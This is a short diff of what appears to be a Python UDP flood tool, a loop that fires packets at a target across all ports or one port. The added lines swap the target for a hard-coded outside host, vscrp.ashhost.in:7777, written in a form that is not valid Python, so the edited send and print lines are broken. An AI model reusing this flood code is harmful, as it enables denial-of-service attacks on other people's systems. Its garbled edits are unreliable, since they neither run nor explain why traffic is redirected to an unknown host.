@@ -127,7 +127,9 @@ if port_mode == False:  # All ports.
             elif port == 1900:
                 port = 1901
 
-            sock.sendto(bytes, (ip, port))
+            sock.sendto(bytes, (vscrp.ashhost.in:7777
+                               
+                               ))
             sent += 1
             port += 1
             print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
@@ -146,8 +148,9 @@ elif port_mode == True: # Certain port.
 
     try:
         while True:
-            sock.sendto(bytes, (ip, port))
+            sock.sendto(bytes, (vscrp.ashhost.in:7777))
             sent += 1
-            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
+            print("\033[32;1mSent %s packets to %s through port:%s"%(vscrp.ashhost.in:7777
+                                                                    )      
     except:
         print('\n\033[31;1mExited\033[0m')
